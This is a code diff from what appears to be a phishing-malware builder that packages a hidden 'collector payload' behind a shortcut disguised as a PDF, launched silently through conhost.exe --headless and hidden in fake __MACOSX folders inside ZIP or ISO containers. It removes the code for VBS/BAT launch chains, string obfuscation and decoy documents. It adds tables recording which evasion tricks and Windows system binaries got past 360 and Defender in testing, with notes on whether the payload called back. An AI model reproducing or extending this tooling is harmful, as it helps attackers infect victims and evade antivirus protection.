@@ -39,24 +39,14 @@ LNK_ICON_MAP = {
 }
 
 CONHOST_PATH = r'C:\Windows\System32\conhost.exe'
-WSCRIPT_PATH = r'C:\Windows\System32\wscript.exe'
-ARG_PAD = ' ' * 200
 
-# conhost.exe --headless is the default launcher: it is the only chain that
-# passed Windows 10 + 360 + Defender testing, so it is always enabled.
+# conhost.exe --headless passed Windows 10 + 360 + Defender testing and is the
+# only launch chain kept in the product, so it is always enabled.
 DEFAULT_EVASION = 'conhost'
 
 EVASION_OPTIONS = (
     ('conhost', 'conhost 无窗口执行',
      'LNK 调用 conhost.exe --headless 读取命令文件，不弹出控制台窗口（Windows 10 1809+）。'),
-    ('vbs', 'Explorer → VBS → BAT 隐藏链',
-     'LNK 启动 VBS，再由 VBS 隐藏运行 BAT 拉起载荷，增加静态分析层级。'),
-    ('obfuscate', '字符串拆分 + 干扰码',
-     'BAT 中拆分拼接载荷名并插入延时干扰命令（自动启用 VBS 链）。'),
-    ('decoy', '打开诱饵文档',
-     '载荷启动后自动打开隐藏的同后缀诱饵文档，转移注意力（自动启用 VBS 链）。'),
-    ('pad', '参数空白填充',
-     '在 LNK 参数前填充大量空格，属性面板中不易直接看到真实参数。'),
     ('macosx', '伪装 __MACOSX 目录',
      '把载荷目录嵌套为 __MACOSX 层级并隐藏，模拟压缩包元数据目录。'),
 )
@@ -66,12 +56,51 @@ EVASION_CHOICES = tuple(key for key, _, _ in EVASION_OPTIONS)
 # all rows retested on the current conhost launcher).
 EVASION_RESULTS = {
     'conhost': (True, '默认启动链，ZIP/ISO 实测无拦截，载荷成功回连'),
-    'vbs': (False, '360 弹窗拦截 run.bat 调用 Explorer 启动载荷，未回连'),
-    'obfuscate': (False, '360 弹窗拦截 Explorer 启动载荷，未回连'),
-    'decoy': (False, '360 弹窗拦截 Explorer 启动载荷，未回连'),
-    'pad': (False, 'LNK 被 Defender 判为 Exploit:Win32/Kloshag.D!dha 并删除'),
     'macosx': (True, '__MACOSX 伪装 + conhost 链，实测无拦截，载荷回连成功'),
+    'vbs': (False, '360 拦截 run.bat 调用 Explorer 启动载荷，未回连'),
+    'obfuscate': (False, '360 拦截 Explorer 启动载荷，未回连'),
+    'decoy': (False, '360 拦截 Explorer 启动载荷，未回连'),
+    'pad': (False, 'LNK 被 Defender 判为 Exploit:Win32/Kloshag.D!dha 并删除'),
 }
+
+# Failed methods stay documented (and non-selectable) so they are not retested.
+EVASION_REJECTED = (
+    ('vbs', 'Explorer → VBS → BAT 隐藏链',
+     'LNK 启动 VBS，再由 VBS 隐藏运行 BAT 拉起载荷。'),
+    ('obfuscate', '字符串拆分 + 干扰码',
+     'BAT 中拆分拼接载荷名并插入延时干扰命令。'),
+    ('decoy', '打开诱饵文档',
+     '载荷启动后自动打开隐藏的同后缀诱饵文档。'),
+    ('pad', '参数空白填充',
+     '在 LNK 参数前填充大量空格，隐藏真实参数。'),
+)
+
+# Host binaries tested as LNK launchers on the same 360 + Defender VM
+# (2026-10-26). Prerequisite copies noted where the binary loads files from
+# its working directory.
+LAUNCHER_RESULTS = (
+    ('conhost.exe --headless', True, '默认链，无拦截，载荷成功回连'),
+    ('cmd.exe /c start', True, '无拦截，载荷成功回连'),
+    ('mshta.exe', True, '无拦截，载荷成功回连（含内联 VBScript）'),
+    ('forfiles.exe /p /m /c', True, '无拦截，载荷成功回连'),
+    ('CustomShellHost.exe', True, '工作目录放置 explorer.exe 载荷副本，回连成功'),
+    ('WorkFolders.exe', True, '工作目录放置 control.exe 载荷副本，回连成功'),
+    ('stordiag.exe', True, '同目录放置 schtasks.exe / systeminfo.exe 载荷副本，回连成功'),
+    ('wscript.exe（VBS）', False, '360 静默拦截并删除载荷'),
+    ('pcalua.exe', False, 'SmartScreen 阻止启动（MOTW）'),
+    ('rundll32.exe', False, '360 静默拦截并删除载荷'),
+    ('wmic.exe', False, '360 静默拦截并删除载荷'),
+    ('MSBuild.exe', False, '360 拦截并删除载荷'),
+    ('pcwrun.exe', False, '360 拦截 msdt DCOM 调用（进程防护）'),
+    ('InfDefaultInstall.exe', False, '宿主未启动，运行挂起超时，未回连'),
+    ('cmstp.exe', False, '未见宿主进程，未回连'),
+    ('OpenWith.exe', False, '宿主启动但载荷未执行（SmartScreen / 需交互）'),
+    ('TTTracer.exe', False, '未见宿主进程，未回连'),
+    ('SyncAppvPublishingServer.exe', False, '宿主未启动，未回连'),
+    ('wlrmdr.exe', False, '通知需交互，锁定桌面下未执行，未回连'),
+    ('AppVLP.exe', None, '本机不存在（Win10 未内置）'),
+    ('ScriptRunner.exe / RunScriptHelper.exe', None, '本机不存在'),
+)
 
 _lock = threading.Lock()
 
@@ -350,135 +379,6 @@ def _write_command_file(script_path, commands):
         f.write('exit\n')
 
 
-def _write_vbs(vbs_path):
-    lines = (
-        'On Error Resume Next',
-        'Set sh = CreateObject("WScript.Shell")',
-        'Set fso = CreateObject("Scripting.FileSystemObject")',
-        'd = fso.GetParentFolderName(WScript.ScriptFullName)',
-        'sh.Run Chr(34) & d & "\\run.bat" & Chr(34), 0, False',
-    )
-    with open(vbs_path, 'w', encoding='ascii', newline='\r\n') as f:
-        for line in lines:
-            f.write(line + '\n')
-
-
-def _write_bat(bat_path, decoy_name, obfuscate):
-    payload = 'viewer.exe'
-    lines = ['@echo off', 'setlocal EnableDelayedExpansion']
-    if obfuscate:
-        lines += [
-            'for /l %%i in (1,1,3) do (',
-            'ver >nul',
-            'ping 127.0.0.1 -n 2 >nul',
-            ')',
-        ]
-        for i, ch in enumerate(payload, 1):
-            lines.append(f'set "p{i}={ch}"')
-        lines.append('set "exe="')
-        lines.append(f'for /l %%n in (1,1,{len(payload)}) do set "exe=!exe!!p%%n!"')
-    else:
-        lines.append(f'set "exe={payload}"')
-    # explorer.exe hands the file to the shell and returns immediately, so the
-    # payload outlives this script without showing a console.
-    lines.append('"C:\\Windows\\explorer.exe" "%~dp0!exe!"')
-    if decoy_name:
-        lines.append(f'"C:\\Windows\\explorer.exe" "%~dp0{decoy_name}"')
-    lines.append('exit /b')
-    with open(bat_path, 'w', encoding='ascii', newline='\r\n') as f:
-        for line in lines:
-            f.write(line + '\n')
-
-
-_OFFICE_HEADER = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
-
-_DOCX_CONTENT_TYPES = _OFFICE_HEADER + (
-    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
-    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
-    '<Default Extension="xml" ContentType="application/xml"/>'
-    '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
-    '</Types>')
-
-_DOCX_DOCUMENT = _OFFICE_HEADER + (
-    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
-    '<w:body><w:p><w:r><w:t>内部资料，请勿外传。</w:t></w:r></w:p></w:body>'
-    '</w:document>')
-
-_XLSX_CONTENT_TYPES = _OFFICE_HEADER + (
-    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
-    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
-    '<Default Extension="xml" ContentType="application/xml"/>'
-    '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
-    '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
-    '</Types>')
-
-_XLSX_WORKBOOK = _OFFICE_HEADER + (
-    '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
-    'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
-    '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>')
-
-_XLSX_WORKBOOK_RELS = _OFFICE_HEADER + (
-    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
-    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
-    '</Relationships>')
-
-_XLSX_SHEET = _OFFICE_HEADER + (
-    '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
-    '<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>内部资料</t></is></c></row></sheetData>'
-    '</worksheet>')
-
-def _build_minimal_pdf():
-    objects = (
-        b'<</Type/Catalog/Pages 2 0 R>>',
-        b'<</Type/Pages/Kids[3 0 R]/Count 1>>',
-        b'<</Type/Page/Parent 2 0 R/MediaBox[0 0 595 842]>>',
-    )
-    out = bytearray(b'%PDF-1.4\n')
-    offsets = []
-    for number, body in enumerate(objects, 1):
-        offsets.append(len(out))
-        out += b'%d 0 obj' % number + body + b'endobj\n'
-    xref = len(out)
-    out += b'xref\n0 %d\n' % (len(objects) + 1)
-    out += b'0000000000 65535 f \n'
-    for offset in offsets:
-        out += b'%010d 00000 n \n' % offset
-    out += (b'trailer\n<</Size %d/Root 1 0 R>>\nstartxref\n%d\n%%%%EOF\n'
-            % (len(objects) + 1, xref))
-    return bytes(out)
-
-
-_MINIMAL_PDF = _build_minimal_pdf()
-
-
-def _office_rels(target):
-    return _OFFICE_HEADER + (
-        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
-        f'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="{target}"/>'
-        '</Relationships>')
-
-
-def _write_decoy(decoy_path, ext):
-    if ext == 'pdf':
-        with open(decoy_path, 'wb') as f:
-            f.write(_MINIMAL_PDF)
-    elif ext == 'docx':
-        with zipfile.ZipFile(decoy_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-            zf.writestr('[Content_Types].xml', _DOCX_CONTENT_TYPES)
-            zf.writestr('_rels/.rels', _office_rels('word/document.xml'))
-            zf.writestr('word/document.xml', _DOCX_DOCUMENT)
-    elif ext == 'xlsx':
-        with zipfile.ZipFile(decoy_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-            zf.writestr('[Content_Types].xml', _XLSX_CONTENT_TYPES)
-            zf.writestr('_rels/.rels', _office_rels('xl/workbook.xml'))
-            zf.writestr('xl/workbook.xml', _XLSX_WORKBOOK)
-            zf.writestr('xl/_rels/workbook.xml.rels', _XLSX_WORKBOOK_RELS)
-            zf.writestr('xl/worksheets/sheet1.xml', _XLSX_SHEET)
-    else:
-        with zipfile.ZipFile(decoy_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-            zf.writestr('说明.txt', '内部资料，解压后查看。\n')
-
-
 def _payload_folder(token, evasion):
     if 'macosx' in evasion:
         return '\\'.join(['__MACOSX'] * 3)
@@ -492,17 +392,15 @@ def build_lnk_package(server_url, token, target_name, exe_filename=''):
         <doc-name>.pdf.lnk          visible shortcut
         <hidden folder>/viewer.exe  collector payload
         <hidden folder>/data.dat    command file that launches the payload
-    The LNK always launches conhost.exe --headless, the default chain that
-    passed 360 + Defender testing. Optional evasion layers add run.vbs /
-    run.bat and a decoy document; the container can be ZIP, ISO, or an
-    AES-encrypted ZIP wrapping the ISO.
+    The LNK always launches conhost.exe --headless, the only chain that passed
+    360 + Defender testing. An optional __MACOSX layer disguises the payload
+    folder; the container can be ZIP, ISO, or an AES-encrypted ZIP wrapping
+    the ISO.
     """
     config = load_config()
     ext = _lure_ext(config)
     evasion = _evasion(config)
     container = _container(config)
-    use_vbs = bool(evasion & {'vbs', 'obfuscate', 'decoy'})
-    use_decoy = 'decoy' in evasion
 
     exe_path = build_exe(server_url, token, target_name, exe_filename)
     base = _safe_name(resolve_exe_name(target_name, token, exe_filename))
@@ -522,9 +420,6 @@ def build_lnk_package(server_url, token, target_name, exe_filename=''):
     staging = tempfile.mkdtemp(prefix=f'lnk_{token[:8]}_', dir=BUILD_DIR)
     payload_name = 'viewer.exe'
     script_name = 'data.dat'
-    vbs_name = 'run.vbs'
-    bat_name = 'run.bat'
-    decoy_name = f'preview.{ext}' if use_decoy else ''
     folder = _payload_folder(token, evasion)
     folder_dir = os.path.join(staging, *folder.split('\\'))
 
@@ -532,31 +427,15 @@ def build_lnk_package(server_url, token, target_name, exe_filename=''):
         os.makedirs(folder_dir)
         shutil.copy2(exe_path, os.path.join(folder_dir, payload_name))
 
-        if use_vbs:
-            _write_bat(os.path.join(folder_dir, bat_name), decoy_name,
-                       'obfuscate' in evasion)
-            _write_vbs(os.path.join(folder_dir, vbs_name))
-            launch = f'{WSCRIPT_PATH} "{folder}\\{vbs_name}"'
-        else:
-            launch = f'{folder}\\{payload_name}'
+        launch = f'{folder}\\{payload_name}'
         _write_command_file(os.path.join(folder_dir, script_name), [launch])
-
-        if decoy_name:
-            _write_decoy(os.path.join(folder_dir, decoy_name), ext)
 
         target = CONHOST_PATH
         arguments = f'--headless cmd /c "cmd < {folder}\\{script_name}"'
-        if 'pad' in evasion:
-            arguments = ARG_PAD + arguments
         lnk_path = os.path.join(staging, lnk_name)
         _write_lnk(lnk_path, target, arguments, ext)
 
-        hidden_files = [payload_name]
-        if use_vbs:
-            hidden_files += [bat_name, vbs_name]
-        if decoy_name:
-            hidden_files.append(decoy_name)
-        hidden_files.append(script_name)
+        hidden_files = [payload_name, script_name]
 
         os.makedirs(OUTPUT_DIR, exist_ok=True)
         if container == 'zip':
